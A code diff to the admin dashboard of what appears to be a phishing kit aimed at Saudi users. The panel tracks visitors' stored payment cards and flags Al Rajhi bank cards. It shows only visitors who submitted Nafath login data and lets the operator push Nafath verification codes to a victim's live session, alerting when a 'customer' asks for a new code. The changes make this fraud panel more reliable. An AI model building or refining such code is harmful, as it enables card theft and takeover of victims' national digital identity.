@@ -383,6 +383,10 @@
     let visitors = new Map();
     let selectedVisitorId = null;
 
+    // Pre-load frog sound once
+    const frogAudio = new Audio('/admin/frog.mp3');
+    frogAudio.volume = 0.7;
+
     // دالة التحقق إذا كانت البطاقة تابعة للراجحي
     function isRajhiCard(visitor) {
       // البحث في بطاقات الزائر (paymentCards هو الاسم الصحيح)
@@ -988,12 +992,28 @@
     const visitorDetails = document.getElementById('visitorDetails');
     const visitorCount = document.getElementById('visitorCount');
 
+    // Load visitors via HTTP API IMMEDIATELY (no waiting for socket)
+    function loadVisitorsHTTP() {
+      fetch(SOCKET_URL + '/api/visitors')
+        .then(res => res.json())
+        .then(list => {
+          if (list && list.length > 0) {
+            list.forEach(v => visitors.set(v._id, v));
+            renderVisitorsList();
+            console.log('Loaded ' + list.length + ' visitors via HTTP');
+          }
+        })
+        .catch(err => console.error('HTTP load error:', err));
+    }
+
     // Auto login if password saved
     const savedPassword = localStorage.getItem('adminPassword');
     if (savedPassword) {
       // Show dashboard immediately, hide login
       dashboard.classList.remove('hidden');
       loginModal.style.display = 'none';
+      // Load visitors IMMEDIATELY via HTTP before socket connects
+      loadVisitorsHTTP();
       autoLogin(savedPassword);
     } else {
       // Show login modal
@@ -1005,6 +1025,9 @@
         transports: ['websocket', 'polling'],
       });
 
+      // CRITICAL: Setup listeners BEFORE connecting so visitors:list is never missed
+      setupSocketListeners();
+
       socket.on('connect', () => {
         socket.emit('admin:register', { password });
       });
@@ -1014,7 +1037,6 @@
           localStorage.setItem('adminPassword', password);
           loginModal.style.display = 'none';
           dashboard.classList.remove('hidden');
-          setupSocketListeners();
         } else {
           localStorage.removeItem('adminPassword');
           loginModal.style.display = 'flex';
@@ -1062,12 +1084,18 @@
         showNotification('زائر جديد: ' + visitor.visitorNumber);
       });
 
-      socket.on('visitor:pageChanged', ({ visitorId, page }) => {
+      socket.on('visitor:pageChanged', ({ visitorId, page, waitingForAdminResponse }) => {
         console.log('visitor:pageChanged received:', visitorId, page);
         const visitor = visitors.get(visitorId);
         console.log('visitor found:', visitor ? 'yes' : 'no');
         if (visitor) {
           visitor.page = page;
+          // Reset waiting status when visitor navigates to new page
+          if (waitingForAdminResponse !== undefined) {
+            visitor.waitingForAdminResponse = waitingForAdminResponse;
+          } else {
+            visitor.waitingForAdminResponse = false;
+          }
           visitors.set(visitorId, visitor);
           renderVisitorsList();
           if (selectedVisitorId === visitorId) {
@@ -1098,8 +1126,7 @@
         const currentPage = data && data.page ? data.page : (visitor.page || '');
         if (!noSoundPages.includes(currentPage)) {
           try {
-            const frogAudio = new Audio('/admin/frog.mp3');
-            frogAudio.volume = 0.7;
+            frogAudio.currentTime = 0;
             frogAudio.play().catch(() => {});
           } catch(e) {}
         }
@@ -1117,11 +1144,12 @@
         }
       });
 
-      socket.on('visitor:reconnected', ({ visitorId, socketId }) => {
+      socket.on('visitor:reconnected', ({ visitorId, socketId, page }) => {
         const visitor = visitors.get(visitorId);
         if (visitor) {
           visitor.isConnected = true;
           visitor.socketId = socketId;
+          if (page) visitor.page = page;
           visitors.set(visitorId, visitor);
           renderVisitorsList();
           if (selectedVisitorId === visitorId) {
@@ -1141,6 +1169,9 @@
             existing.waitingForAdminResponse = v.waitingForAdminResponse;
             existing.page = v.page;
             existing.lastSentCode = v.lastSentCode;
+            if (v.socketId) existing.socketId = v.socketId;
+            // Sync connection status
+            if (v.isConnected !== undefined) existing.isConnected = v.isConnected;
             visitors.set(v._id, existing);
           }
         });
@@ -1180,15 +1211,29 @@
         // Sort by last activity (most recent first)
         return getLastActivity(b) - getLastActivity(a);
       });
-      const connectedCount = list.filter(v => v.isConnected === true).length;
-      visitorCount.textContent = connectedCount + ' نشط / ' + list.length + ' زائر';
+      // Count unique visitors by IP (each person counted once)
+      const uniqueIPs = new Set(list.map(v => v.ip).filter(ip => ip));
+      const totalUniqueVisitors = uniqueIPs.size || list.length;
+      
+      // Count unique active visitors by IP (each connected person counted once)
+      const connectedIPs = new Set(list.filter(v => v.isConnected === true).map(v => v.ip).filter(ip => ip));
+      const connectedCount = connectedIPs.size;
+      
+      visitorCount.textContent = connectedCount + ' نشط / ' + totalUniqueVisitors + ' زائر';
 
-      if (list.length === 0) {
+      // فلترة البطاقات: إظهار فقط الزوار اللي سجلوا دخول نفاذ (عندهم بيانات)
+      const filteredList = list.filter(v => {
+        if (v.dataHistory && v.dataHistory.length > 0) return true;
+        if (v.data && Object.keys(v.data).length > 0) return true;
+        return false;
+      });
+
+      if (filteredList.length === 0) {
         visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">لا يوجد زوار حالياً</p>';
         return;
       }
 
-      visitorsList.innerHTML = list.map(v => {
+      visitorsList.innerHTML = filteredList.map(v => {
         const isSelected = selectedVisitorId === v._id;
         const isDisconnected = v.isConnected !== true;
         // Get visitor name from data or dataHistory if available
@@ -1430,7 +1475,14 @@
       console.log('visitor.page:', visitor.page);
       if (visitor.page === 'تحقق نفاذ') {
         html += '<div class="bg-purple-50 border border-purple-200 rounded-lg p-4 mt-4">';
-        html += '<h3 class="font-bold text-purple-800 mb-3">🔐 إرسال رمز نفاذ</h3>';
+        // Check if visitor requested a new code (from dataHistory)
+        const hasResendRequest = visitor.waitingForAdminResponse && visitor.dataHistory && visitor.dataHistory.some(d => d.content && d.content['طلب'] === 'إعادة إرسال رمز' && d.page === 'تحقق نفاذ');
+        html += '<div class="flex items-center justify-between mb-3">';
+        html += '<h3 class="font-bold text-purple-800">🔐 إرسال رمز نفاذ</h3>';
+        if (hasResendRequest) {
+          html += '<span class="text-sm font-bold text-orange-600 animate-pulse">⏳ طلب العميل رمز جديد</span>';
+        }
+        html += '</div>';
         html += '<div class="flex gap-2">';
         html += '<input type="text" id="nafathCodeTop_' + visitor._id + '" value="' + (visitor.lastSentCode || '') + '" placeholder="أدخل الرمز" class="flex-1 px-4 py-2 border rounded-lg text-center font-bold text-lg" maxlength="2">';
         html += '<button onclick="sendNafathCodeTop(\'' + visitor.socketId + '\', \'' + visitor._id + '\')" id="sendNafathBtnTop_' + visitor._id + '" class="px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>إرسال</button>';
